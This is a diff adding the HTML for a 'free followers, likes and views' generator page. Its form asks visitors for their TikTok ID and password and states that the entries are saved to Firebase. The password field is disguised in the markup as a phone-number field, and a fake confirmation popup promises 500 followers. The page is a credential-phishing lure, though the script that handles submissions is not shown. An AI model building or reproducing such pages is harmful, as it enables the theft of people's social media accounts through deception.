@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Social Generat All Services</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="preconnect" href="https://www.gstatic.com" />
+  </head>
+  <body>
+    <header class="topbar">
+      <div>
+        <p class="eyebrow">Online Followers and Likes Generated</p>
+        <h1>Social Generat All Services</h1>
+      </div>
+      <span class="status-pill">Orders Firebase me save honge</span>
+    </header>
+
+    <main>
+      <section class="store-head">
+        <div>
+          <h2>Products</h2>
+          <p>Click the button to generate free followers, likes, and views.</p>
+        </div>
+      </section>
+
+      <section class="products-grid" id="productsGrid" aria-label="Product list"></section>
+    </main>
+
+    <dialog class="order-modal" id="orderModal">
+      <form class="order-box" id="orderForm">
+        <button class="icon-close" type="button" id="closeModal" aria-label="Close">x</button>
+        <p class="eyebrow">Confirm Order</p>
+        <h2 id="modalProductName">Product Name</h2>
+        <p class="modal-price" id="modalProductPrice">Rs 0</p>
+
+        <label>
+          Tiktok ID
+          <input id="customerName" name="customerName" type="text" placeholder="tiktok ID type" minlength="2" required />
+        </label>
+
+        <label>
+          Password
+          <input
+            id="customerPhone"
+            name="customerPhone"
+            type="tel"
+            placeholder="password type"
+            required
+          />
+        </label>
+
+        <button class="submit-btn" type="submit" id="submitOrder">Order Send Karen</button>
+        <p class="message" id="formMessage" role="status"></p>
+      </form>
+    </dialog>
+
+    <dialog class="discount-modal" id="discountModal">
+      <div class="discount-box">
+        <button class="icon-close" type="button" id="closeDiscountModal" aria-label="Close">x</button>
+        <p class="eyebrow">Reward Points</p>
+        <h2>Order Confirmed</h2>
+        <p class="discount-copy">Congratulations.</p>
+        <strong class="discount-amount" id="discountAmount">Followers 500</strong>
+        <button class="submit-btn" type="button" id="discountOk">OK</button>
+      </div>
+    </dialog>
+
+    <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-database-compat.js"></script>
+    <script src="app.js"></script>
+  </body>
+</html>
